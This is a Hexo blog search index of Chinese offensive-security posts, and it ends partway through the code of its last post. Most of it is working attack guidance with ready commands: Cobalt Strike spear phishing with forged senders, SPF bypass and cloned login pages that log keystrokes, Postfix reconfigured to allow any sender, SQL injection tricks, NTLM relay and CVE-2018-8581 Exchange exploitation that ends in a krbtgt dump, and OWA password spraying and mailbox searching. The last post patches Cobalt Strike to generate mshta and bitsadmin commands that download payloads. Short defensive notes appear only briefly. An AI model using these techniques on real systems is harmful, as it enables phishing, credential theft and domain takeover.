<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Cobalt Strike Spear Phish]]></title>
    <url>%2Farchives%2Fspear_phish.html</url>
    <content type="text"><![CDATA[0x00 简介关于Spear phish 和发件人伪造的工具有很多个，比如gophish、SimpleEmailSpoofer、命令行工具swaks等，每个工具都有其特点，当然Cobalt Strike也有此功能。官方介绍戳我。今天主要来介绍一下CS里面的此功能怎么使用。 0x01 CS Spear PhishCS的Spear Phish位置在： 一张图说明功能： 使用此功能的前提是需要有一个smtp服务器来供我们来转发邮件，当然可以使用公共smtp服务，另外也可以参考《Something about email spoofing》 中提到的方法来搭建。这里的使用很简单，首先构造目标列表，使用：12mail namemail name 中间的分隔符为[tab],可以不添加name 添加好以后就是这个样子： 下面，要配置发件模板，这里配置很简单，只需要复制一份原始邮件即可，比如一份密码重置邮件： 选择显示原始邮件，并将其内容保存。 在这里如果要伪造发件人，需要修改From: 否则就不需要做什么别的修改。之后，配置对应的Mail server，就可以进行发送邮件了，这里需要注意一点,为了绕过SPF的检查，Bunce to需设置为与Mail server同域，如Mail server为 mail.evi1cg.me,Bunce to可设置为`admin@evi1cg.me`。 之后点击Send则可发送邮件，收到的邮件与模板一致。 另外查看SRF为PASS状态： 另外，CS也有发送附件的功能，但是原版本的CS发送附件有一个Bug，即如果附件为中文名称，则会在最后的邮件中显示乱码附件： 所以在这里我们需要对CS动刀了，经过调试，成功定位到mail\Eater.java，需要对此类中的createAttachment方法进行修改：1234567891011121314private BodyPart createAttachment(String name) throws IOException &#123; File file = new File(name); String namez = file.getName(); String filename = new String(namez.getBytes("utf-8"),"ISO8859-1"); Body body = (new StorageBodyFactory()).binaryBody((InputStream)(new FileInputStream(name))); Map temp = new HashMap(); temp.put("name", filename); BodyPart bodyPart = new BodyPart(); bodyPart.setBody(body, "application/octet-stream", temp); bodyPart.setContentTransferEncoding("base64"); bodyPart.setContentDisposition("attachment"); bodyPart.setFilename(filename); return bodyPart;&#125; 这样就可以解决附件乱码问题了: 0x02 Web clone另外在这里还有一个与Web Clone结合的地方，首先，我们先Clone一个需登录的网站，如网易邮箱： 这里可以选择开启键盘记录功能。 开启Clone： 设置spear phish: Embed URL选择刚刚克隆的url，发送邮件，此时用户点击重置按钮，则会跳转到Clone的站点： 此时，用户输入会被记录： emmm. 大概就介绍这么多吧。]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不知道列名的情况下注入]]></title>
    <url>%2Farchives%2Fsqli_without_knowing_columns_names.html</url>
    <content type="text"><![CDATA[0x00 简介在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？ 在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。 0x01 不使用表名查询正常的查询如下： 其中，列名为id,name,pass,mail,phone，使用union查询1select 1,2,3,4,5 union select * from users; 接着，就可以继续使用数字来对应列,如3对应了表里面的pass:1select `3` from (select 1,2,3,4,5 union select * from users)a; 当 ` 不能使用的时候，使用别名来代替：1select b from (select 1,2,3 as b,4,5 union select * from users)a; 在注入中查询多个列：1select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; FROM:Extracting data without knowing columns names]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Sqli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Remote NTLM relaying through CS]]></title>
    <url>%2Farchives%2FRemote_NTLM_relaying_through_CS.html</url>
    <content type="text"><![CDATA[0x00 为什么写这个？最近在学习Exchange在提权中的应用的时候，碰到一个问题，即：如果我们现在拥有了一个内网的windows主机，如何利用这台主机使用CVE_2018_8581 ？大概的结构是这样： 攻击者通过某种方式获取一台域内主机权限。并获取了此主机的域成员账号密码，在获取DC及Exchange Server的ip地址后，利用CVE_2018_8581 0x01 利用思路思路一：编译py版的impacket在做这个的时候，第一想法就是有没有windows下可用的impacket，后来找了找，还真有impacket_static_binaries，于是就拿来用了。但是后来发现是有问题的。首先，利用需要关闭win的445端口，这个就需要重启，这是我们非常不愿意做的，另外，似乎win版的ntlmrelayx 和 smbrelayx还不能用。 所以直接放弃了。 思路二：通过meterpreter进行NTLM relaying这个思路是之前看到的《Remote NTLM relaying through meterpreter on Windows port 445》来的。在这篇文章里面，详细分析了是谁占用了445，如何进行转发再进行Remote NTLM relaying。利用CVE_2018_8581，我们需要两个端口，445和80(80可以是其他端口，用来开启HTTP服务)，但是实际测试的时候，并不顺利，成功添加路由，开启端口转发，开启 socks4a 之后，本地通过proxychains开启一个web server，在内网其他主机请求这个server的时候，并未看到任何请求（可能是姿势不对，成功的师傅还望不吝赐教）。所以通过此方式，也并没达到我期望的效果。 思路三：通过CS部署VPN这个也是我觉得最简单的一种方式，在上面两种思路失败之后，就只能期待试用这种方式来进行了，还好，成功啦~ Cobaltstrike 的covertvpn的介绍，可以看这里。 在获取到一个Becon之后,右键连接-&gt;Pivoting-&gt;Deploy VPN 之后，选择对应的内网ip 点击ADD来添加本地网口： 在这里有多种方式的隧道，可以根据自己的需要选择，默认UDP是开销最小的一种方式。添加以后，点击Deploy则可部署成功。 之后，在Interfaces中可以看到对应信息： 之后我们在VPS上配置此网口：1sudo ifconfig Interface CIDR example:1sudo ifconfig phear5 10.211.55.225/24 前面的ip地址就是要给我们的网口配置的ip地址，相当于在域里面新接入了一台主机 之后，就可以与内网主机进行通信了。 这种方式我录了一个Demo： Tips：部署VPN只需要普通用户权限即可。但是获取当前用户账号密码需要提权。 0x02 如何防御 CVE_2018_8581删除域内某用户的DCSync权限，可使用 PowerView。 具体命令为：1Remove-DomainObjectAcl -TargetIdentity "DC=cgdomain,DC=com" -PrincipalIdentity user -Rights DCSync 根据自己的实际环境进行修改 修复Exchage权限，可使用 Fix-DomainObjectDACL.ps1 具体命令为： 1. .\Fix-DomainObjectDACL.ps1 -Fix 0x03 进一步测试经过进一步测试以及对漏洞的原理再次学习，发现其实我们只需要开启一个web服务即可，所以，可以使用任意端口(在impacket中，HTTPRelayServer默认端口为80，Exchange2domain已支持自定义端口)。 当然，上述 思路三 对smbrelay也是非常好用的一种方式。现在补充一下 思路二 的具体利用方法。 由于我们不需要smb Server，所以也不需要向《Remote NTLM relaying through meterpreter on Windows port 445》中所述对445端口进行转发，我们只需要将web端口转发出来即可。在获取一个meterpreter会话之后，添加路由:1meterpreter &gt; run post/multi/manage/autoroute 之后开启socks4a代理。 经过测试，发现msf的portfwd不怎么稳定，所以我选择了使用ew，当然，也可以使用lcx等其他转发工具。在vps上开启转发：1☁ lcx ./ew -s lcx_tran -l 8088 -f 127.0.0.1 -g 8044 监听本地8088端口，并将数据转发到127.0.0.1的8044端口 然后在我们有权限的主机上执行：1C:\Users\sanfeng\Desktop&gt;ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088 监听本地8044端口的数据，并将数据转发到103...*的8080端口。需要注意的是，有权限的主机监听端口=vps转发端口=Exchange2domain监听端口 之后，在vps上配置proxychains，ubuntu上proxychains的配置文件路径为/etc/proxychains.conf。修改代理配置文件，如下：12345[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"socks4 127.0.0.1 1080 之后，我们就可一执行Exchange2domain了：1proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u user -p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt 注意监听端口跟上面一致，proxyip为我们有权限的主机的ip地址。 所以，整个攻击过程如下： 希望以上对你有帮助。 0x04 参考 Remote NTLM relaying through meterpreter on Windows port 445 impacket_static_binaries VPN Pivoting with Cobalt Strike]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exchange Privilege Elevation]]></title>
    <url>%2Farchives%2FExchange_Privilege_Elevation.html</url>
    <content type="text"><![CDATA[环境DC : 10.211.55.200Exchange (2013): 10.211.55.201Attacker: 10.211.55.2 条件得到某域用户；与Exchange服务器可互通，不需要入域； 利用工具https://github.com/Ridter/Exchange2domain 具体过程获取需要的参数：-ah: 自己的监听服务器ip -u: 可登录邮箱的用户名 -p:对应该用户的密码 -d: 域名-th:域控ip地址还有就是Exchange服务器地址，默认使用Exchange的版本号为Exchange2013，其他版本可使用--exchange-version 来指定。 Example:1python Exchange2domain.py -ah 10.211.55.2 -u sanfeng -p 1qaz@WSX -d cgdomain.com -th 10.211.55.200 10.211.55.201 获取到hash以后，可通过pash-the-hash来执行命令: 参考 Privexchange Abusing Exchange: One API call away from Domain Admin Impacket]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exchange用户伪造(CVE-2018-8581)]]></title>
    <url>%2Farchives%2FCVE_2018_8581.html</url>
    <content type="text"><![CDATA[环境DC : 192.168.31.129Exchange (2013): 192.168.31.129Attacker: 192.168.31.243 条件得到用户: beiguoxia与Exchange服务器可互通，不需要入域。 利用工具https://github.com/WyAtu/CVE-2018-8581/ 具体过程获取本机地址： 修改脚本内容： ip为Exchange服务器的ip地址，其他的改成对应的信息,FLAG改为1，增加权限委托。 Exploit：1python CVE-2018-8581.py 添加成功以后，打开outlook客户端。使用已经获取的邮箱账号(此处为beiguoxia)登录。 依次选择偏好设置-账户-高级-代理，添加附加邮箱： 此后，可接管被攻击账号的收件箱，查看所有邮件： 删除权限委托: 将脚本中FLAG修改为0，再次执行： 1python CVE-2018-8581.py]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exchange在渗透测试中的利用]]></title>
    <url>%2Farchives%2FExchange_Hack.html</url>
    <content type="text"><![CDATA[0x00 Exchange简介Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。 0x01 Exchange Endpoint通常Exchange Server 有以下endpoint，即可访问的连接如下：123456789https://Exchangeserver/AutoDiscover/https://Exchangeserver/Ecp/https://Exchangeserver/EWS/https://Exchangeserver/mapi/https://Exchangeserver/Microsoft-Server-ActiveSync/https://Exchangeserver/OAB/https://Exchangeserver/OWA/https://Exchangeserver/PowerShell/https://Exchangeserver/Rpc/ 每个endpoint的作用如下： endpoint 说明 /autodiscover 自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。 /ecp “Exchange Control Panel” Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台 /ews “Exchange Web Services” Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互 /mapi Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持 /Microsoft-Server-ActiveSync 用于移动应用程序访问电子邮件 /OAB “Offline Address Book” 用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担 /owa “Outlook Web APP” Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等 /powershell 用于服务器管理的Exchange管理控制台 /RPC 早期的Outlook还使用称为Outlook Anywhere的RPC交互 以上endpoint中，常用于暴力破解的有/owa 、/ews、/Microsoft-Server-ActiveSync 及/autodiscover，如owa的暴力破解（passwordspray）：抓取登录包如下： 用户名可尝试使用domain\username、domian.com\username、username 使用某密码进行暴力破解： /Microsoft-Server-ActiveSync 爆破为401认证，需要对用户账号密码进行base64处理: YWRtaW46YWRtaW4= -&gt; admin:admin /ews、/rpc 等几个endpoint同样为401认证，账号密码的加密方式为NTLM Authenticate： 爆破需对账号密码进行处理之后在进行。 0x02 Get UserList验证Exchange对Exchange的利用首先要确定其是否使用了exchange，关于判断的方式，我知道的方式有:1、checkO365 2、owa 登录页面，如： 3、特殊域名：访问如下域名1234https://autodiscover.domain.com/autodiscover/autodiscover.xmlhttps://owa.domian/owa/https://mail.domain.com/https://webmail.domain.com/ 获取用户列表之后我们需要获取其至少一个账号的信息，那么就需要取搜集获取某域的用户列表，除了top username进行爆破，还可以使用theharvester、Mailget等工具进行搜集，另外还有一种通过延时来判断的方式。在MailSniper 写了这样几种来判断内部域和存在用户的方法： Invoke-DomainHarvest Invoke-UsernameHarvestOWA Invoke-UsernameHarvestEAS 首先来看Invoke-DomainHarvest，这里通过了几种方式来获取内部域名，构造参数如下：1Invoke-DomainHarvestOWA -ExchHostname domian.com 脚本会构造如下url:1234$OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")$OWAURL2 = ("https://" + $ExchHostname + "/owa/")$autodiscoverurl = ("https://" + $ExchHostname + "/autodiscover/autodiscover.xml")$ewsurl = ("https://" + $ExchHostname + "/EWS/Exchange.asmx") 在未指定brute的情况下，脚本会先请求autodiscoverurl,若失败，再请求ewsurl，并通过请求头里面的NTLM Authenticate数据来猜测内部域名，如： 需要注意到是，未指定brute的时候需要更改-ExchHostname 为对应的autodiscoverurl及ewsurl 指定brute的情况下，则会使用通过时间延迟的方式来检测域名是否存在，首先会构造一些不存在的域及用户名请求owa，并记录其响应时间，之后使用构造的域字典及随机用户名来请求owa，根据其响应时间的不同来判断域及用户名，在这里有两种brute方式，第一种通过导入域名列表：1Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute 第二种通过公司名称来猜测：1Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName "bla bla" -OutFile potentially-valid-domains.txt -brute 获取域名之后，可导入用户名进行用户名存在检测：12Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txtInvoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads 1 -OutFile eas-valid-users.txt PS : 作者说这个问题提交给微软以后并没有修复，但是实际测试效果并不好，但是没准碰到可以使用的情况也说不定。 当获取到一个用户的账号密码之后，可以通过Get-GlobalAddressList来获取GlobalAddress的用户邮箱地址：1Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password 0x03 Brute Force在这里暴力破解的地方有很多个，首先可以通过burpsuite对OWA进行暴力破解，另外就是/autodiscover、/ews、/Microsoft-Server-ActiveSync 等几个endpoint，可利用的工具如：MailSniper、Ruler、SprayingToolkit，可根据个人喜好取舍。为了防止账号因多次登陆失败触发告警或账户被封禁，建议使用同密码爆破用户名的方式进行暴力破解。下面介绍一下MailSniper的相关方法的使用。 通过owa爆破： 12Import-Module .\MailSniper.ps1Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose 通过ews爆破： 1Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose 通过Microsoft-Server-ActiveSync爆破： 1Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose 通过autodiscover 爆破：在MailSniper中没有写对autodiscover的爆破，可以选择使用burp、ruler或者SprayingToolkit。 1python atomizer.py owa autodiscoverhost password user.txt 1./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v 0x04 Search mail在获取到某用户邮箱账号密码以后，我们可以对其邮件内容进行搜索，除了直接登录邮件外，也可以使用Exchange的接口进行邮件的检索，其接口的相关开发可以参考《Exchange Web Service(EWS)开发指南%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/)》，在外网情况下，可使用此工具来列出邮件内容。1./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox 搜索某字符串：1./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn 或者使用MailSniper的Invoke-SelfSearch添加-remote 参数，输入账号密码即可。使用接口可以bypass一些owa的2FA。 内网情况下可使用MailSniper来快速检索，如使用xiaoming\domain用户登录某主机，可在该主机上搜索xiaoming的邮箱（不需要密码）1Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv 1.csv 如果获得了域管理员的密码，可以检索任意邮件的内容： 1Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator -AdminPassword password -Term "*pass*" -Folder all 检索可使用-Term或者正则-Regex来指定关键字，-ImpersonationAccount用于将当前用户身份合法伪装其他邮箱用户，进而获得查询所有邮箱用户邮件的权限，如果查询失败，可以尝试添加-ExchangeVersion更换Exchange版本,目前支持版本为Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013,Exchange2013_SP1 0x05 后渗透在获取一个用户的账号密码之后，如何进入内网？这里有一个神器Ruler,在Outlook中有一个Rules and Alerts的功能，利用此功能，可执行一些特定的如执行命令等操作，关于ruler的具体使用，可以参考相关文章，另外在内网中，如何去发现Exchange服务器，如何使用NTLM中继来接管某用户邮箱的权限，这些内容在《深入Exchange Server在网络渗透下的利用方法》中有了很详细的讲解，在这里就不多做阐述。 另外需要补充一点可能有用的东西，Exchange安装以后会创建一个Organization Management 安全组： 该组内的成员除了访问Exchagne设置外，可以修改其他Exchagne安全组的成员身份，如Exchange Trusted Subsystem,此组为Exchange Windows Permissions的成员 默认情况下，Exchange Windows Permissions安全组对安装Exchange的域的域对象具有writeDACL权限,这就意味着，我们可以进行权限的提升，详细的文章可以参考《Escalating privileges with ACLs in Active Directory》。 0x06 总结本文记录了我自己对Exchange在渗透中的利用的一些方式的总结，欢迎补充，更详细的内容可以查看参考的文章。 0x07 参考 https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0 https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/ https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/ https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Something about email spoofing]]></title>
    <url>%2Farchives%2FEmail_spoofing.html</url>
    <content type="text"><![CDATA[0x00 这是个啥？一般来说，我们收到一封邮件之后，都会首先看发件人，如果是比较重要的邮件，我们可能会去看发件人地址，但是，如果发件人是伪造的，你还能知道是谁再给你发邮件么？当我们在谷歌搜索发件人伪造的时候，可以看到很多很多的网站提供了这样的功能： 这些网站没有测试，不知道能不能成功伪造。 那到底是什么导致的发件人伪造呢？下面我们来分析分析造成发件人伪造的成因。 0x01 SMTP是什么？要想了解成因，我们需要首先了解一下什么是SMTP，首先先了解一下几个概念：MUA:Mail User Agent。用户邮件代理,用户通过MUA接收发送邮件.例如Outlook, FoxMail等。MTA: Mail Transfer Protocol。邮件传输代理,是SMTP的一种实现，MTA仅仅负责邮件的传输。如果信件的目的地并不是本身的用户，且该封信的相关数据符合使用 MTA 的权力， 那么MTA 就会将该封信再传送到下一部主机上。这即是所谓的转递的功能。MDA: Mail Deliver Agent，邮件分发代理。负责将接收到的邮件保存在邮件服务器上，在这里可以设置对邮件进行过滤或自动回复。MRA: Mail Receive Agent，邮件接收代理,用来实现IMAP,POP3协议,负责与MUA交互,将服务器上的邮件通过IMAP以及POP3传输给客户端。 SMTP全称是Simple Mail Transfer Protocol,直译过来就是简单邮件传输协议，主要的工作就是把邮件信息从发件人的邮件服务器中传送到接收人的邮件服务器中，偶尔我们使用MUA来发送邮件的话,也承载传输用户邮件到发件服务器的功能，但是SMTP存在一个问题，就是没有对发送方进行一个身份验证。用下面的图来说明一下邮件的投递过程。 1、用户利用MUA寄信到MTA，这里面包含了几个项：发信人与发信网站：例如 admin@evi1cg.me，其中evi1cg.me就是发信网站，即收信件的MTA。收信人与收信网站：例如 admin@email.server，其中admin就是email.server里的一个账号。2、当MTA收到信件后，会通过DNS的MX记录进行查询，如果email.server是MTA自己，此时MTA就会把邮件交给MDA处理，放置到收信者的信箱中。3、如果email.server不是自己，那么这个信件就会被转送出去。4、当远程MTA收到本地MTA转发的邮件后，会将信件交给它的MDA处理，等待用户的读取或下载。 正是由于MTA之间转发邮件是不需要认证的，所以这就成了可以伪造发件人的原因。 0x02 怎么搭建SMTP Server？如何快速搭建自己的SMTP Server？这个网上有很多教程，这里为了快速搭建，可以选择使用ewomail，代码是开源的,搭建起来也比较方便，也有很好地说明文档，EwoMail是基于postfix和Dovecot，按照说明文档很快就可以部署完毕了，部署完毕以后需要添加用户账号：之后就可以通过添加的账号来发送邮件了。 0x03 如何伪造域名？关于伪造域名有一个很好用的工具SimpleEmailSpoofer，下面我们就使用这个工具来测试一下：1python SimpleEmailSpoofer.py -t 目标邮箱 -f 要伪造的发件人地址 -n From_name -e 邮件内容 -j 邮件主题 -s 你自己的smtp地址 -p 25 --user 你添加的用户 --pass 你添加用户的密码 在这里可以看到报错了，Sender address rejected: not owned by user xxx, 这里是postfix设置的问题。需要进行一下修改/etc/postfix/main.cf找到smtpd_sender_login_maps，修改为：1smtpd_sender_login_maps = mysql:/etc/postfix/mysql/mysql-sender-login-maps.cf,pcre:/etc/postfix/login_maps.pcre 新建/etc/postfix/login_maps.pcre1/^(.*)$/ test@yourdomain.com 意思是允许用户test@yourdomain.com的用户使用任意domain 找到smtpd_recipient_restrictions，删除reject_unknown_sender_domain，这样就不会对发送的域进行验证了。 修改完成以后，执行以下命令：12postmap /etc/postfix/login_maps.pcrepostfix reload 修改完成以后，再次发送： 查看gmail: 当然，在原始邮件里面，还是有自己的域名信息。如何尽量减少自己的信息，可以参考这篇文章。 经过测试，如果收信服务器对SPF校验不通过的邮件未作处理，仍然可以伪造添加过SPF记录的域。如QQ邮箱检查SPF失败就直接拒绝接收邮件，但是gmail仍然接收。这里要注意一点，SPF中如果配置为~all，则表示为接受来信，但是做标记，QQ邮箱里就会接收到此类伪造的邮件，但是回放置于垃圾邮件里。 0x04 如何检测？这里有一个工具可以用来检测域名是否可以被伪造:spoofcheck，使用很简单，比如baidu: 0x05 如何解决？为了使得域名不会被伪造，需要为域名正确配置SPF、DKIM、DMARC。只配置SPF是不行的，关于SPF的配置可以参考这里，关于DKIM的配置，可以看这里，关于DMARC的配置可以参考这里。 0x06 参考1、https://www.jianshu.com/p/610d9bf0ae8b2、http://lomu.me/post/SPF-DKIM-DMARC-PTR3、https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix4、https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/5、https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[匿名管道读取CMD回显信息]]></title>
    <url>%2Farchives%2FGet_cmd.html</url>
    <content type="text"><![CDATA[最近改exp的时候用到的，加到exp里面回显执行信息，保存一份~12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define EXE_NAME NULL//TEXT("Cmd.exe")#define EXE_CMD TEXT("Cmd.exe /C ipconfig/all")int main()&#123; char Buffer[4096]; STARTUPINFO sInfo;//新进程的主窗口特性 PROCESS_INFORMATION pInfo; SECURITY_ATTRIBUTES sa; HANDLE hRead, hWrite; DWORD bytesRead; //读取代码的长度 sa.nLength = sizeof(SECURITY_ATTRIBUTES);/ /结构体的大小，可用SIZEOF取得 sa.lpSecurityDescriptor = NULL;//安全描述符 sa.bInheritHandle = TRUE;;/ /安全描述的对象能否被新创建ÆÆ的进程继承 if (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, 0)) //创建匿名管道 &#123; return GetLastError();//返回最近的一个错误，0表示正常 &#125; GetStartupInfo(&amp;sInfo)； sInfo.cb = sizeof(sInfo); sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; sInfo.wShowWindow = SW_HIDE; sInfo.hStdError = hWrite; //将管道的写端交给子进程 sInfo.hStdOutput = hWrite; memset(&amp;pInfo, 0, sizeof(pInfo)); if (!CreateProcess(EXE_NAME, EXE_CMD, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sInfo, &amp;pInfo)) //创建子进程 &#123; CloseHandle(hWrite); CloseHandle(hRead); return GetLastError(); &#125; CloseHandle(hWrite); //关闭父进程的写端 for (int i = 0;; ++i) &#123; if (!ReadFile(hRead, Buffer, sizeof(Buffer) - 1, &amp;bytesRead, NULL)) //读取内容 &#123; break; &#125; Buffer[bytesRead] = 0; printf("%s\n", Buffer); &#125; WaitForSingleObject(pInfo.hProcess, INFINITE);//当等待仍在挂起状态时，句柄被关闭，那么函数行为是未定义的。该句柄必须具有 SYNCHRONIZE 访问权限; CloseHandle(hRead); system("pause"); return 0;&#125; from: http://www.cnblogs.com/onlyac/p/5346478.html]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CS teamserver.bat]]></title>
    <url>%2Farchives%2Fteamserver.html</url>
    <content type="text"><![CDATA[CS的teamserver经常是在linux服务器上跑的，有小伙伴问在win server上怎么跑，所以弄了一个批处理，需要的看着改改，win上面需要装java JDK,win上默认没有keytool,所以需要自己去生成一个cobaltstrike.store ~123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@echo off :check_java java -version &gt;nul 2&gt;&amp;1 if %errorLevel% == 0 ( goto:check_permissions ) else ( echo [-] is Java installed? goto:eof ) :check_permissions echo [+] Administrative permissions required. Detecting permissions... set TempFile_Name=%SystemRoot%\System32\BatTestUACin_SysRt%Random%.batemp (echo "BAT Test UAC in Temp" &gt;%TempFile_Name% ) 1&gt;nul 2&gt;nul if exist %TempFile_Name% ( echo [+] Success: Administrative permissions confirmed. del %TempFile_Name% 1&gt;nul 2&gt;nul goto:check_certificate ) else ( echo [-] Failure: Current permissions inadequate. goto:eof ):check_certificate set certificate=".\cobaltstrike.store" if exist %certificate% ( goto:test_arguments ) else ( echo [!] Please generate the cobaltstrike.store ! echo [!] Example: keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname "CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth" goto:eof ) :test_arguments set argC=0 for %%x in (%*) do Set /A argC+=1 if %argC% LSS 2 ( echo [-] teamserver ^&lt;host^&gt; ^&lt;password^&gt; [/path/to/c2.profile] [YYYY-MM-DD] echo ^&lt;host^&gt; is the default IP address of this Cobalt Strike team server echo ^&lt;password^&gt; is the shared password to connect to this server echo [/path/to/c2.profile] is your Malleable C2 profile echo [YYYY-MM-DD] is a kill date for Beacon payloads run from this server goto:eof ) else ( goto:run_cobal ):run_cobal java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer %*]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobal Strike 自定义OneLiner]]></title>
    <url>%2Farchives%2FCustom_Oneliner.html</url>
    <content type="text"><![CDATA[0x00 起因在使用Cobal Strike的过程中，我们可以看到里面已经集成了几种 Script Web Delivery，如下图： 而且在生成以后打开site,只需要点击Copy URL就可以把命令复制出来，再写aggressor脚本时也想要实现这个功能，发现copy以后只有url，并没有命令，所以为了一探究竟，还是把CS解压，grep了一把，定位到common.CommonUtils，发现了OneLiner方法： 所以要实现这个功能我们就需要对这个class进行修改，增加我们想要的命令。 0x01 使用javassist修改classJavassist是一个能够操作字节码框架，通过它我们能很轻易的修改class代码。首先下载javassist ，新建一个java工程，右键工程导入javassist包。 我们可能常用mshta http://host/test.png 的方式来请求payload，可以使用一下代码进行添加：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package changeclass;import java.io.IOException;import javassist.CannotCompileException;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import javassist.NotFoundException;public class change &#123; public static void main(String[] args) &#123; updateMethod(); &#125; public static void updateMethod()&#123; try &#123; ClassPool cPool = new ClassPool(true); //如果该文件引入了其它类，需要利用类似如下方式声明 //cPool.importPackage("java.util.List"); //设置cobaltstrike.jar文件的位置 cPool.insertClassPath("/tmp/cobaltstrike.jar"); //获取该要修改的class对象 CtClass cClass = cPool.get("common.CommonUtils"); //获取到对应的方法 CtMethod cMethod = cClass.getDeclaredMethod("OneLiner"); //更改该方法的内部实现 //需要注意的是对于参数的引用要以$开始，不能直接输入参数名称 cMethod.setBody("&#123; if (\"bitsadmin\".equals($2)) &#123;" + "String f = garbage(\"temp\");" + "return \"cmd.exe /c bitsadmin /transfer \" + f + \" \" + $1 + \" %APPDATA%\\\\\" + f + 